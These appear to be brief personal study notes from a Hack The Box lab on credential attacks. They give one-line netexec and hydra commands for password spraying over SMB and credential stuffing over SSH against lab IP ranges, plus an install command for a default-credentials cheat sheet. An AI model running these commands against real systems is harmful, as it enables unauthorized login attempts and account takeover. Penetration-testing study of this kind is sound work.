## Password spraying

```shell
3kjS@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
## Credential stuffing

```shell
3kjS@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```
## Default credentials

```shell
3kjS@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```
![[Screenshot 2026-05-07 at 12.11.49.png]]
![[Screenshot 2026-05-07 at 12.12.39.png]]
